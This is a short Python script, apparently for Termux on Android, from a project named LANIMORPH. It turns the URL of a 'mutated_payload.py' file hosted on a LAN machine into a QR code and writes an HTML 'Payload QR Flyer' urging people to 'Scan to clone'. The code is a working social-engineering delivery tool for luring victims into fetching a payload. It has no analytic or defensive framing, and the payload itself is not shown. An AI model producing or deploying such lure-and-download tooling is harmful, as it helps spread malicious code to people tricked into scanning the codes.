#!/usr/bin/env python3
import os, qrcode, base64
from datetime import datetime
payload = "http://192.168.1.33:8000/mutated_payload.py"
ts = datetime.now().strftime("%Y%m%d_%H%M%S")
qrfile = f"/data/data/com.termux/files/home/LANIMORPH/qr/QR_{ts}.png"
img = qrcode.make(payload)
img.save(qrfile)
html = f"""
<html><body><h1>Payload QR Flyer</h1>
<p>Scan to clone:</p>
<img src="QR_{ts}.png"><br>
<code>{payload}</code>
</body></html>"""
with open(f"/data/data/com.termux/files/home/LANIMORPH/qr/flyer_{ts}.html", "w") as f:
    f.write(html)
print("[+] QR Flyer created:", qrfile)
